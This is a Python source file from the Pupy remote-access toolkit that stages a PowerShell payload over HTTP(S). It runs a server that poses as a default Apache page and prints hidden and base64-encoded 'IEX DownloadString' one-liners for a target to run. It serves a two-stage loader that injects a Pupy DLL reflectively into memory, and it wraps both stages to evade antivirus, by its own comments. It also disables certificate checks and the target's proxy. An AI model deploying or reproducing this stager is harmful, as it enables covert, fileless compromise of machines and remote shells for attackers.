#!/usr/bin/env python
# -*- coding: utf-8 -*-
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SocketServer import ThreadingMixIn
from pupygen import generate_binary_from_template
from pupylib.PupyCredentials import Credentials
from pupylib.PupyConfig import PupyConfig
from pupylib.utils.term import colorize
from base64 import b64encode
from ssl import wrap_socket
import random
import string
import tempfile
import os.path
import pupygen
import ssl
import re

# "url_random_one" and "url_random_two_x*" variables are fixed because if you break you ps1_listener, the ps1_listener payload will not be able to get stages -:(
url_random_one      = "index.html"
url_random_two_x86  = "voila.html"
url_random_two_x64  = "tata.html"

APACHE_DEFAULT_404 = """<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>"""

class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.server_version = "Apache/2.4.27 (Unix)"
        self.sys_version    = ""

        if self.path == "/%s" % url_random_one:
            
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            
            # Send stage 1 to target
            self.wfile.write(self.server.stage1)
            print colorize("[+] ","green")+"[Stage 1/2] Powershell script served !"

        elif self.path == "/%s" % url_random_two_x86 or self.path == "/%s" % url_random_two_x64:
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            
            stage2 = None
            if self.path == "/%s" % url_random_two_x86: 
                print colorize("[+] ","green") + "remote script is running in a x86 powershell process"
                stage2 = self.server.stage2_x86
            else:
                print colorize("[+] ","green") + "remote script is running in a x64 powershell process"
                stage2 = self.server.stage2_x64
            
            # Send stage 2 to target
            self.wfile.write(stage2)
            print colorize("[+] ","green") + "[Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll embedded) served!"
            print colorize("[+] ","green") + colorize("%s:You should have a pupy shell in few seconds from this host..." % self.client_address[0], "green")

        else:
            self.send_response(404)
            self.send_header('Content-type','text/html')
            self.end_headers()
            self.wfile.write(APACHE_DEFAULT_404)

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    def set(self,conf, sslEnabled, stage1, stage2_x86, stage2_x64):
        self.payload_conf   = conf
        self.stage1         = stage1
        self.stage2_x86     = stage2_x86
        self.stage2_x64     = stage2_x64

        if sslEnabled:
            credentials = Credentials()
            keystr      = credentials['SSL_BIND_KEY']
            certstr     = credentials['SSL_BIND_CERT']

            fd_cert_path, tmp_cert_path = tempfile.mkstemp()
            fd_key_path, tmp_key_path   = tempfile.mkstemp()

            os.write(fd_cert_path, certstr)
            os.close(fd_cert_path)
            os.write(fd_key_path, keystr)
            os.close(fd_key_path)

            self.socket = wrap_socket (self.socket, certfile=tmp_cert_path, keyfile=tmp_key_path, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
            self.tmp_cert_path  = tmp_cert_path
            self.tmp_key_path   = tmp_key_path

    def server_close(self):
        try:
            os.unlink(self.tmp_cert_path)
            os.unlink(self.tmp_key_path)
        except:
            pass
        self.socket.close()

def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTargetProxy=False, sslEnabled=True, nothidden=False):
    try:
        
        protocol             = 'http'
        ssl_cert_validation  = ''
        not_use_target_proxy = ''
        hidden               = '-w hidden '

        if nothidden:
            hidden = ''

        if sslEnabled:
            protocol            = 'https'
            ssl_cert_validation = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
        
        if not useTargetProxy:
            not_use_target_proxy = '$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();'

        powershell      = "[NOT_USE_TARGET_PROXY][SSL_CERT_VALIDATION]IEX(New-Object Net.WebClient).DownloadString('[PROTOCOL]://[LINK_IP]:[LINK_PORT]/[RANDOM]');"
        repls           = ('[NOT_USE_TARGET_PROXY]', not_use_target_proxy), ('[SSL_CERT_VALIDATION]', ssl_cert_validation), ('[PROTOCOL]', protocol), ('[LINK_IP]', '%s' % link_ip), ('[LINK_PORT]', '%s' % port)
        powershell      = reduce(lambda a, kv: a.replace(*kv), repls, powershell)

        launcher            = powershell.replace('[RANDOM]', url_random_one)
        basic_launcher      = "powershell.exe [HIDDEN]-noni -nop [CMD]".replace('[HIDDEN]', hidden)
        oneliner            = basic_launcher.replace('[CMD]', '-c \"%s\"' % launcher)
        encoded_oneliner    = basic_launcher.replace('[CMD]', '-enc %s' % b64encode(launcher.encode('UTF-16LE')))

        # Compute stage1 to gain time response
        ps_template_stage1 = """
        if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
        {{
        {0}
        }}
        else
        {{
        {1}
        }}
        """
        launcher_x64 = powershell.replace('[RANDOM]', url_random_two_x64)
        launcher_x86 = powershell.replace('[RANDOM]', url_random_two_x86)

        stage1 = ps_template_stage1.format(launcher_x64, launcher_x86)
        
        # For bypassing AV
        stage1 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage1))
        
        # generate both pupy dll to gain time response
        print colorize("Generating puppy dll to gain server reaction time. Be patient...", "red")
        tmpfile    = tempfile.gettempdir()
        output_x86 = pupygen.generate_ps1(conf, output_dir=tmpfile, x86=True)
        output_x64 = pupygen.generate_ps1(conf, output_dir=tmpfile, x64=True)
        
        stage2_x86 = open(output_x86).read()
        stage2_x64 = open(output_x64).read()
        
        # For bypassing AV
        stage2_x86 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2_x86))
        stage2_x64 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2_x64))
        
        # TO DO create file in a tmp dir and remove it

        try:
            server = ThreadedHTTPServer((ip, port),PupyPayloadHTTPHandler)
            server.set(conf, sslEnabled, stage1, stage2_x86, stage2_x64)
        except Exception as e:
            # [Errno 98] Adress already in use
            raise

        print colorize("[+] ","green")+"copy/paste one of these one-line loader to deploy pupy without writing on the disk :"
        print " --- "
        print colorize(oneliner, "green")
        print " --- "
        print colorize(encoded_oneliner, "green")
        print " --- "
        print colorize("Please note that even if the target's system uses a proxy, this previous powershell command will not use the proxy for downloading pupy", "yellow")
        print " --- "

        print colorize("[+] ","green") + 'Started http server on %s:%s ' % (ip, port)
        print colorize("[+] ","green") + 'waiting for a connection ...'
        server.serve_forever()
    except KeyboardInterrupt:
        print 'KeyboardInterrupt received, shutting down the web server'
        server.server_close()
        
        # clean local file created
        os.remove(output_x86)
        os.remove(output_x64)
        
        exit()
